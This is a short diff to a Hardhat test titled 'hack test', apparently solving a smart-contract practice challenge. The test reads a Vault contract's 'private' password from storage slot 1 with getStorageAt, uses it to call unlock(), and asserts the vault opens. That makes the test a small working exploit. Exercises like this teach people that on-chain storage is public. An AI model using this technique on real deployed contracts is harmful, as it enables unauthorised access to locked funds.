@@ -13,7 +13,9 @@ describe("test", function () {
         Vault = await VaultInstance.deploy(ethers.utils.formatBytes32String("ETH"));
     });
     it("hack test", async function () {
-        const r = await ethers.provider.getStorageAt(Vault.address, 0);
-        console.log(ethers.utils.parseBytes32String(r)); //ETH
+        const r = await ethers.provider.getStorageAt(Vault.address, 1);
+        expect(ethers.utils.parseBytes32String(r)).to.equal("ETH");
+        await Vault.unlock(r);
+        expect(await Vault.locked()).to.equal(false);
     });
 });
